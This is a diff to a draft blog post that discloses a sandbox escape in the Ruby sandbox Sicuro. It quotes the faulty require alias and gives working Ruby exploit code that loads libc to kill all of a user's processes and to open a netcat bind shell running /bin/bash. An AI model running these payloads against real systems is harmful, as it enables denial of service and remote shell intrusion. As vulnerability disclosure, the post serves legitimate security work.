@@ -7,7 +7,7 @@ draft: true
 
 [Jens Nockert](http://twitter.com/jensnockert) has exposed a rather major security hole in Sicuro.
 
-Under basically any circumstances, Sicuro can be used to execute untrusted code. The demonstrated technique used by Jens was to terminate all processes that can be terminated by the user who the initial `Sicuro#eval` call was made under. I believe it may also be possible to perform some 
+Under basically any circumstances, Sicuro can be used to execute untrusted code. The demonstrated technique used by Jens was to terminate all processes that can be terminated by the user who the initial `Sicuro#eval` call was made under. I have demonstrated the ability to use it to access a remote shell, but am unsure if it could be used for privilege escalation.
 
 # The main problem
 
@@ -15,43 +15,37 @@ It appears that attempts at making it more efficient have actually left Sicuro w
 
 The following is the relevant part of the code for lazily loading trusted components. You can view it in context in [lib/sicuro/base.rb](https://github.com/duckinator/sicuro/blob/761e955fbbba07638d69bc62159199cdf0716a7d/lib/sicuro/base.rb#L254-256), lines 254 through 256.
 
-<code>
-# Without Gem we won't require unresolved gems, therefore we restore the original require.
-# This allows us to lazy-require other trusted components from the same $LOAD_PATH.
-::Kernel.module_eval { alias require gem_original_require }
-</code>
+    # Without Gem we won't require unresolved gems, therefore we restore the original require.
+    # This allows us to lazy-require other trusted components from the same $LOAD_PATH.
+    ::Kernel.module_eval { alias require gem_original_require }
 
 Following is a tidied up version of the code that exposed the bug.
 
-<code>
-require 'dl'
-require 'dl/import'
-
-module Libc
-  extend DL::Importer
-  dlload '/lib/libc.so.6'
-  extern 'int kill(int, int)'
-end
-
-Libc.kill(0, 9)
-</code>
+    require 'dl'
+    require 'dl/import'
+    
+    module Libc
+      extend DL::Importer
+      dlload '/lib/libc.so.6'
+      extern 'int kill(int, int)'
+    end
+    
+    Libc.kill(0, 9)
 
 Changing `Libc.kill(0, 9)` to `Libc.kill(-1, 9)` will terminate _all processes the user who made the call to `Sicuro.eval` can terminate._
 
 Here is similar code that will allow you to execute arbitrary shell code:
 
-<code>
-require 'dl'
-require 'dl/import'
-
-module Libc
-  extend DL::Importer
-  dlload '/lib/libc.so.6'
-  extern 'int system(const char*)'
-end
-
-Libgc.system('nc -lp 1337 -e /bin/bash &amp;')
-</code>
+    require 'dl'
+    require 'dl/import'
+    
+    module Libc
+       extend DL::Importer
+       dlload '/lib/libc.so.6'
+       extern 'int system(const char*)'
+    end
+    
+    Libc.system('nc -lp 1337 -e /bin/bash &amp;')
 
 Congratulations, you now can run `netcat $IP 1337` to connect.
 
